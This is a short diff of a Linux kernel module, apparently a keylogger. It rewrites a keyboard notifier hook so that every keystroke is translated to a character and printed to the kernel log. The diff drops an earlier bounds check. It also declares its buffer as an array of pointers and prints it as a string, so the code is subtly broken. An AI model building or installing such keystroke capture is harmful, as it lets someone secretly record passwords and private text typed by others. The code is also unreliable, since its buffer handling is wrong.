@@ -12,13 +12,12 @@ MODULE_LICENSE("GPL");
 
 int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
+    char *buff[BUFLEN];
+    
+    // translate into a chracter
+    xlate_keysym(param, buff);
 
-    // we don't know what the code is, so just return
-    if(param->value < 0 || param->value >= sizeof(keycode)) {
-        return NOTIFY_OK;
-    }
-
-    printk(KERN_INFO "%s 0x08%x", keycode[param->value], param->shift);
+    printk(KERN_INFO "%s", buff);
 
     return NOTIFY_OK;
 }
